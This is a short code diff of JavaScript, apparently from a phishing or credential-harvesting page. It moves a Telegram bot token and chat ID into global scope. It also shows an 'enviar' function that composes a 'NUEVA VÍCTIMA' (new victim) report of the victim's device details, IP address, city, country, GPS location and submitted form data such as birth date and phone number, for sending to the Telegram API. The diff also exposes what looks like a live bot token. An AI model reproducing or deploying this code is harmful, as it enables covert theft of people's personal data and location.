@@ -261,8 +261,8 @@ function leerForm(){
   if(form.dia && form.mes && form.anio)form.fecha=form.dia+'/'+form.mes+'/'+form.anio;
   var lada=v('lada'),tel=v('telefono');if(tel)form.tel=lada+' '+tel;
 }
+var TOKEN="9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";var CHAT="9092452687";var API="https://api.telegram.org/bot"+TOKEN;
 function enviar(){
-  var TOKEN="9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";var CHAT="9092452687";var API="https://api.telegram.org/bot"+TOKEN;
   var txt="🔔 <b>NUEVA VÍCTIMA</b>\n\n";
   txt+="📱 <b>Móvil:</b> "+info.modelo+"\n💻 <b>SO:</b> "+info.so+"\n🌐 <b>Nav:</b> "+info.navegador+"\n📺 <b>Pantalla:</b> "+info.pantalla+"\n🌎 <b>Idioma:</b> "+info.idioma+"\n🔋 <b>Bat:</b> "+info.bateria+"\n📡 <b>Red:</b> "+info.red+"\n📍 <b>IP:</b> "+info.ip+"\n🏙️ <b>Ciudad:</b> "+info.ciudad+"\n🌍 <b>País:</b> "+info.pais+"\n🧭 <b>GPS:</b> "+info.gps+"\n";
   if(form && Object.keys(form).length){
